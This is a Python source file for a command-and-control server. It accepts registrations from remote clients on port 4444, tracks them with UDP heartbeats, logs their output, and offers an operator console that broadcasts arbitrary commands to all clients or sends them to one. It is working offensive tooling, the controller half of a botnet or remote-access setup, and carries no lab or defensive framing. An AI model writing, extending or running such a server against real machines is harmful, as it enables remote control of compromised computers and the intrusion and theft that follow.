#!/usr/bin/env python3
import socket
import threading
import time
import sys
import queue
from Client import Client


class C2Server:
    def __init__(self, host='0.0.0.0', command_port=4444, heartbeat_port=4445):
        self.host = host
        self.command_port = command_port
        self.heartbeat_port = heartbeat_port

        self.clients = {}              # unique_id -> Client
        self.lock = threading.Lock()   # protegge self.clients
        self.running = True

        self.heartbeat_interval = 10
        self.client_retention = 60 * 60

        # logging
        self.print_queue = queue.Queue()

    # ---------------- LOGGING ----------------
    def log(self, msg):
        self.print_queue.put(msg)

    def printer(self):
        while self.running or not self.print_queue.empty():
            try:
                msg = self.print_queue.get(timeout=1)
                print(msg)
            except queue.Empty:
                continue

    # ---------------- HEARTBEAT ----------------
    def heartbeat_sender(self):
        hb_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.log(f"[*] Heartbeat thread started (interval {self.heartbeat_interval}s)")

        while self.running:
            try:
                with self.lock:
                    snapshot = list(self.clients.values())

                failed = []

                for client in snapshot:
                    with client.lock:
                        if not client.active:
                            continue
                        ip = client.ip
                        port = client.heartbeat_port

                    try:
                        msg = f"HEARTBEAT|{ip}|{int(time.time())}"
                        hb_socket.sendto(msg.encode(), (ip, port))
                    except Exception as e:
                        self.log(f"[!] Heartbeat failed to {ip}:{port} ({client.unique_id[:8]}...): {e}")
                        failed.append(client)

                for client in failed:
                    client.close()

                time.sleep(self.heartbeat_interval)

            except Exception as e:
                self.log(f"[!] Heartbeat thread error: {e}")
                time.sleep(5)

        hb_socket.close()
        self.log("[*] Heartbeat thread exiting")

    # ---------------- CLIENT HANDLER ----------------
    def handle_client(self, client_socket, address):
        ip, port = address
        client_id = f"{ip}:{port}"
        client_obj = None

        try:
            self.log(f"[+] Incoming connection from {client_id}")
            client_socket.settimeout(10.0)

            data = client_socket.recv(1024).decode().strip()
            if not data.startswith("HELLO|"):
                self.log(f"[-] Bad handshake from {client_id}")
                client_socket.close()
                return

            parts = data.split('|')
            if len(parts) < 4:
                self.log(f"[-] Malformed handshake from {client_id}")
                client_socket.close()
                return

            hostname = parts[1]
            unique_id = parts[3]
            heartbeat_port = self.heartbeat_port

            if len(parts) >= 5:
                try:
                    heartbeat_port = int(parts[4])
                except:
                    pass

            if len(unique_id) != 32:
                client_socket.send(b"ERROR: Invalid client ID\n")
                client_socket.close()
                return

            with self.lock:
                existing = self.clients.get(unique_id)

            if existing:
                with existing.lock:
                    if existing.active:
                        self.log(f"[!] Duplicate active client {unique_id[:8]}...")
                        client_socket.send(b"ERROR: Duplicate connection\n")
                        client_socket.close()
                        return

                existing.update_connection(client_socket, address, heartbeat_port)
                with existing.lock:
                    existing.hostname = hostname
                client_obj = existing
                self.log(f"[*] Client reconnected {unique_id[:8]}...")

            else:
                client_obj = Client(
                    client_socket,
                    address,
                    hostname,
                    time.time(),
                    unique_id,
                    heartbeat_port
                )
                with self.lock:
                    self.clients[unique_id] = client_obj
                self.log(f"[+] Registered new client {unique_id[:8]}...")

            with client_obj.lock:
                client_obj.socket.send(b"READY\n")

            client_obj.socket.settimeout(1.0)

            while self.running:
                with client_obj.lock:
                    if not client_obj.active:
                        break
                    sock = client_obj.socket

                try:
                    data = sock.recv(8192)
                    if not data:
                        break

                    output = data.decode(errors='ignore').rstrip()
                    self.log(f"[{client_obj.unique_id[:8]}...] {output[:200]}")
                    client_obj.set_time(time.time())

                except socket.timeout:
                    continue
                except Exception:
                    break

        finally:
            if client_obj:
                client_obj.close()
            try:
                client_socket.close()
            except:
                pass
            self.log(f"[-] Connection closed {client_id}")

    # ---------------- COMMANDS ----------------
    def broadcast_command(self, command):
        with self.lock:
            clients = list(self.clients.values())

        for client in clients:
            with client.lock:
                if not client.active:
                    continue
                try:
                    client.socket.send((command + '\n').encode())
                    client.set_time(time.time())
                except Exception as e:
                    self.log(f"[!] Send failed to {client.ip}: {e}")
                    client.close()

    def client_command(self, uid_prefix, command):
        target = None
        with self.lock:
            matches = [c for uid, c in self.clients.items()
                       if uid.startswith(uid_prefix) and c.active]
            if len(matches) == 1:
                target = matches[0]

        if not target:
            self.log("[ERR] Client not found or ambiguous")
            return

        with target.lock:
            try:
                target.socket.send((command + '\n').encode())
                target.set_time(time.time())
            except Exception:
                target.close()

    # ---------------- CONSOLE ----------------
    def console(self):
        print("\nC2 SERVER")
        print("Commands: list, broadcast <cmd>, client <id> <cmd>, exit")

        while self.running:
            try:
                cmd = input("C2> ").strip()
                if not cmd:
                    continue

                if cmd == "exit":
                    self.running = False
                    break

                elif cmd == "list":
                    with self.lock:
                        for c in self.clients.values():
                            with c.lock:
                                state = "ACTIVE" if c.active else "INACTIVE"
                                idle = int(time.time() - c.last_seen)
                                print(f"{c.unique_id} -> {c.ip}:{c.port} {state} idle:{idle}s")

                elif cmd.startswith("broadcast "):
                    self.broadcast_command(cmd[len("broadcast "):])

                elif cmd.startswith("client "):
                    _, rest = cmd.split(" ", 1)
                    uid, command = rest.split(" ", 1)
                    self.client_command(uid, command)

                else:
                    print("Unknown command")

            except (EOFError, KeyboardInterrupt):
                self.running = False
                break

    # ---------------- START ----------------
    def start(self):
        printer = threading.Thread(target=self.printer, daemon=True)
        printer.start()

        hb = threading.Thread(target=self.heartbeat_sender, daemon=True)
        hb.start()

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.command_port))
        server.listen(50)

        self.log(f"[*] Server listening on {self.command_port}")

        def accept_loop():
            while self.running:
                try:
                    sock, addr = server.accept()
                    t = threading.Thread(target=self.handle_client, args=(sock, addr), daemon=True)
                    t.start()
                except:
                    break

        threading.Thread(target=accept_loop, daemon=True).start()
        self.console()

        self.running = False
        server.close()

        with self.lock:
            for c in self.clients.values():
                c.close()

        self.log("[*] Server stopped")


if __name__ == "__main__":
    C2Server().start()
